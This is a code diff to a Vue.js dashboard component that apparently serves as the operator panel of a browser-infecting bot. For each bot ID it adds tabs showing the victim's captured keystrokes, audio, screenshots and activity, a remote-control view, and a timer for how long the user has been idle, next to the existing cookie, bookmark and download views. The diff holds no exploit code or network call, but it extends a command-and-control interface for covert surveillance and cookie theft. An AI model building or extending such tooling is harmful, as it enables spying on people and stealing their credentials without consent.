@@ -35,6 +35,12 @@
       <p>
         Bot UUID is <code>{{ info.id }}</code>
       </p>
+      <p v-if="info.last_active_at">
+        User last active at: <strong>{{ info.last_active_at | moment("HH:mm:ss") }}</strong> (<strong>{{ idleTimeDisplay }}</strong> ago)
+      </p>
+      <p v-else>
+        No activity recorded yet.
+      </p>
       <p>
         <b-button-group v-if="info">
           <b-button
@@ -58,14 +64,32 @@
       <DataHistory :show="history_tab_show" :id="info.id" />
       <b-tabs lazy>
         <b-tab title="Cookies">
-          <DataCookies :id="info.id" />
+          <DataCookies :id="info.id" /> <!-- :enable-clipboard="enableClipboard" -->
         </b-tab>
+        <b-tab title="Remote">
+          <DataRemote :id="info.id" :user-agent="info.user_agent" />
+        </b-tab>
+
+        <b-tab title="Activity">
+          <DataActivity :id="info.id" :show="true" />
+        </b-tab>
+
         <b-tab title="BookMarks" :lazy="false">
           <DataBookMarks :id="info.id" />
         </b-tab>
         <b-tab title="Downloads">
           <DataDownloads :id="info.id" />
         </b-tab>
+        <b-tab title="Audio">
+          <DataAudio :id="info.id" />
+        </b-tab>
+        <b-tab title="Keyboard">
+          <DataKeyboard :id="info.id" />
+        </b-tab>
+        <b-tab title="Screenshots">
+          <DataScreenshots :show="true" :id="info.id" />
+        </b-tab>
+
         <b-tab title="Config">
           <DataConfig :id="info.id" :name="info.name" :refresh="refresh" />
         </b-tab>
@@ -82,6 +106,14 @@ import DataCookies from "@/components/DataCookies.vue";
 import DataBookMarks from "@/components/DataBookMarks.vue";
 import DataDownloads from "@/components/DataDownloads.vue";
 import DataConfig from "@/components/DataConfig.vue";
+import DataKeyboard from "@/components/DataKeyboard.vue";
+import DataAudio from "@/components/DataAudio.vue";
+
+import DataScreenshots from "@/components/DataScreenshots.vue";
+import DataRemote from "@/components/DataRemote.vue";
+import DataActivity from "@/components/DataActivity.vue";
+import moment from "moment";
+
 export default {
   name: "BasicBoard",
   props: {
@@ -93,6 +125,10 @@ export default {
       type: Function,
       required: true,
     },
+    // enableClipboard: {
+    //   type: Boolean,
+    //   default: false,
+    // },
   },
   components: {
     DataTabs,
@@ -101,13 +137,43 @@ export default {
     DataBookMarks,
     DataDownloads,
     DataConfig,
+    DataKeyboard,
+    DataAudio,
+    DataScreenshots,
+    DataRemote,
+    DataActivity,
   },
 
   data() {
     return {
       tabs_tab_show: false,
       history_tab_show: false,
+      currentTime: moment(),
+      timer: null,
     };
+  },
+  computed: {
+    idleTimeDisplay() {
+      if (!this.info.last_active_at) return "Unknown";
+      const lastActive = moment(this.info.last_active_at);
+      const diff = moment.duration(this.currentTime.diff(lastActive));
+      
+      const parts = [];
+      if (diff.days() > 0) parts.push(`${diff.days()}d`);
+      if (diff.hours() > 0) parts.push(`${diff.hours()}h`);
+      if (diff.minutes() > 0) parts.push(`${diff.minutes()}m`);
+      parts.push(`${diff.seconds()}s`);
+      
+      return parts.join(" ");
+    }
+  },
+  mounted() {
+    this.timer = setInterval(() => {
+      this.currentTime = moment();
+    }, 1000);
+  },
+  beforeDestroy() {
+    if (this.timer) clearInterval(this.timer);
   },
   methods: {
     reset_options_modal() {
